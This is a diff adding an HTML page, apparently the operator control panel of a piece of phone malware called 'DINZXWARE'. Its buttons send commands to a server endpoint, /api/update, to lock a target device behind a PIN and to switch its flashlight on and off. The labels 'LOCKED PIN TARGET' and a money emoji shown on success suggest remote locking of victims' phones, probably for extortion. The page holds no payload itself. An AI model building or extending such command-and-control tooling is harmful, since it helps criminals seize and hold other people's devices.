@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DINZXWARE | CONTROL PANEL</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; }
+        .btn-dinz { border: 1px solid #f00; transition: 0.3s; }
+        .btn-dinz:hover { background: #f00; color: #fff; box-shadow: 0 0 20px #f00; }
+    </style>
+</head>
+<body class="p-10">
+    <div class="max-w-lg mx-auto border border-green-900 p-6 rounded-lg shadow-2xl bg-black">
+        <h1 class="text-4xl font-extrabold text-center text-red-600 mb-8 italic">DINZXWARE ☠️</h1>
+        
+        <div class="grid gap-4">
+            <button onclick="sendCmd('lock', 'true')" class="btn-dinz p-4 rounded font-bold uppercase">🔒 LOCKED PIN TARGET</button>
+            <button onclick="sendCmd('flashlight', 'on')" class="bg-yellow-800 p-4 rounded font-bold uppercase text-black">🔦 SENTER ON</button>
+            <button onclick="sendCmd('flashlight', 'off')" class="bg-gray-800 p-4 rounded font-bold uppercase text-white">🔦 SENTER OFF</button>
+        </div>
+
+        <div id="logs" class="mt-10 p-4 bg-gray-900 h-40 overflow-y-auto text-xs border border-green-500">
+            [SYSTEM]: DinzXWare Ready... 😈
+        </div>
+    </div>
+
+    <script>
+        async function sendCmd(task, value) {
+            const log = document.getElementById('logs');
+            log.innerHTML += `<p class="text-blue-400">[WAIT] Dinz sending ${task}...</p>`;
+            try {
+                const res = await fetch('/api/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ task, value })
+                });
+                if(res.ok) log.innerHTML += `<p class="text-green-400">[OK] BERHASIL! 🤑</p>`;
+                else log.innerHTML += `<p class="text-red-500">[FAIL] SERVER ERROR</p>`;
+            } catch (e) {
+                log.innerHTML += `<p class="text-red-700">[FATAL] KONEKSI MATI!</p>`;
+            }
+            log.scrollTop = log.scrollHeight;
+        }
+    </script>
+</body>
+</html>
